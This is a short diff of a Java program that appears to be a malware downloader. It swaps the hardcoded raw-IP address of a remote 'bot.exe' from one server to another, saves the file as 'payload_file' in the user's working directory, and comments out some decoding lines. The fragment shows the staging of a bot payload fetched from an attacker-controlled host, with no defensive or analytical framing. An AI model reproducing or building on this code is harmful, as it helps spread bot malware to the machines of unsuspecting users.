@@ -6,13 +6,13 @@ import java.util.Base64;
 public class Main {
 	public static void main(String args[]) throws InterruptedException, IOException,IllegalArgumentException
 	{
-	     String link = "http://157.230.227.120/bot.exe";
+	     String link = "http://159.65.11.28/bot.exe";
 	     File payload_file = new File(System.getProperty("user.dir") + "/bot.exe");
 	     
 	     
-	     //File payload_file2 = new File("decoded.exe");
-	     
-	    //Decodes the file
+//	     File payload_file2 = new File("decoded.exe");
+//	     
+//	    Decodes the file
 //	     BufferedReader br = new BufferedReader(new FileReader(payload_file));
 //	     
 //	     String main = null;
